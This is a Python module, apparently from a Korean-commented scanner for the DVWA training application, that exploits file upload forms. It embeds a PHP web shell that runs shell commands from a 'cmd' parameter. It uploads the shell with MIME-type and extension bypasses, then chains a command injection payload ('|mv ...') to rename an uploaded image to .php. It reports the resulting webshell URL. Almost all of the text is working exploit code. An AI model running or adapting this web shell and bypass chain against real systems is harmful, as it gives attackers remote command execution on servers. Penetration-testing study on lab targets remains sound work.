from tabulate import tabulate
import requests
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
import random
import string
import os
from urllib.parse import urlparse

console = Console()

def run(soup, headers, find_path_dic, security_level):
    file_list = [
        'imagggg.jpg',   # high 우회
        'hello.php',    # low, medium 우회
        'mmmmmmm.txt'    # 실패용
    ]

    php_code = b"""GIF89a<?php
    if (isset($_GET['cmd'])) {
        $cmd = $_GET['cmd'];
        $output = shell_exec($cmd);
        echo "<pre>$output</pre>";
    }
    ?>
    <form method=\"GET\">
        <label for=\"cmd\">Enter Command:</label>
        <input type=\"text\" name=\"cmd\" id=\"cmd\" placeholder=\"Enter command\" />
        <input type=\"submit\" value=\"Execute\" />
    </form>
    """



    command_url = next((item['url'] for item in find_path_dic if 'exec' in item['url']), None)
    result_tables = []

    for param_dic in find_path_dic:
        param_url = param_dic['url']
        param_method = param_dic['method']
        param_list = param_dic['param']

        if 'upload' not in param_url:
            continue

        for file_one in file_list:
            print(file_one)
            with open(file_one, "wb") as f:
                f.write(php_code)

            data = {'Upload': 'Upload'}
            files = {}
            ext = os.path.splitext(file_one)[1].lower()

            if security_level == 'medium':
                mime_type = 'image/jpeg'
                with open(file_one, 'rb') as file:
                    for param in param_list:
                        if param not in ['MAX_FILE_SIZE', 'Upload']:
                            files[param] = (file_one, file, mime_type)
                    res = requests.post(param_url, files=files, data=data, headers=headers)
            else:
                with open(file_one, 'rb') as file:
                    for param in param_list:
                        if param not in ['MAX_FILE_SIZE', 'Upload']:
                            files[param] = (file_one, file)
                    res = requests.post(param_url, files=files, data=data, headers=headers)

            ext_type = ext in ['.jpeg', '.jpg', '.png']

            if "succesfully uploaded!" in res.text:
                
                table = Table(show_lines=True)
                table.add_column("항목", style="white", justify="center")
                table.add_column("내용", style="white", justify="center")

                table.add_row("URL", param_url)
                table.add_row("VULN NAME", "File Upload")
                table.add_row("UploadFile", file_one)

                if security_level == 'medium' and not ext_type:
                    table.add_row("Mime_Type", mime_type)

                elif security_level == 'high' and ext_type:
                    shell_file = os.path.splitext(file_one)[0] + '.php'
                    payload = f"|mv ../../hackable/uploads/{file_one} ../../hackable/uploads/{shell_file}"
                    exec_data = {
                        'ip': payload,
                        'Submit': 'Submit'
                    }
                    requests.post(command_url, headers=headers, data=exec_data)

                    parsed_url = urlparse(param_url)
                    base_path = parsed_url.scheme + "://" + parsed_url.netloc
                    app_base = parsed_url.path.split('/vulnerabilities')[0]
                    upload_path = f"{base_path}{app_base}/hackable/uploads/"
                    webshell_url = f"{upload_path}{shell_file}?cmd=whoami"

                    table.add_row("Type_Changing", f"{file_one} → {shell_file}")
                    table.add_row("Webshell URL", webshell_url)

                result_tables.append(table)

    if not result_tables:
        console.print("[!] 탐지된 취약점이 없습니다.", style="bold red")
        return "[!] 탐지된 취약점이 없습니다."

    console.print("\n[italic bold white]\n{:^60}\n[/italic bold white]".format("File Upload 탐지 결과"))
    for table in result_tables:
        console.print(table)

    return "[✓] 탐지된 File Upload 결과 출력 완료."
